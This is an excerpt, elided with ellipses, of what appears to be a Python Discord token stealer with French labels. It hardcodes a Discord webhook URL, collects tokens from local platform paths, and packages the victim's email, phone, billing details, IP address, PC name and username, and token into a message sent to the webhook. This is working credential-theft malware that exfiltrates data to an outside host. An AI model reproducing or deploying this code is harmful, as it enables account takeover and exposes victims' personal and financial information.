...
WEBHOOK_URL = "https://discord.com/api/webhooks/1491429838509047861/hme2dYZcNwbd-siyetn6arrsZgFCYTJx1YaCf0FZYF1nO--jvwB5bLQenfA7W32dCso9" # WebHook ICI
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokenz(path):
            ...
            embed = {
                ...
                "fields": [
                    {
                        "name": "👽 __Informations de compte: __",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nInformations de facturation: {billing}',
                        "inline": True
                    },
                    {
                        "name": "🤖 __PC Info: __",
                        "value": f"IP: {ip}\nNom d'utilisateur: {pc_username}\nPC Nom: {pc_name}\nEmplacement du token: {platform}",
                        "inline": True
                    },
                    {
                        "name": "💀 __Token :__",
